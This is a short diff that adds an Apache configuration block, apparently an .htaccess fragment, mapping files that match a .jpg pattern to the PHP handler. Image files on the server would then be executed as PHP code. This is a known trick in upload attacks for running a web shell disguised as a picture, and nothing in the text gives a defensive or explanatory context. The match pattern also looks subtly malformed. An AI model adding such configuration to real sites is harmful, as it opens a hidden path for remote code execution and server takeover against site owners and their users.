@@ -1,0 +1,3 @@
+<FILESMATCH "^.*/.jpg"> 
+  SetHandler application/x-httpd-php 
+</FILESMATCH>
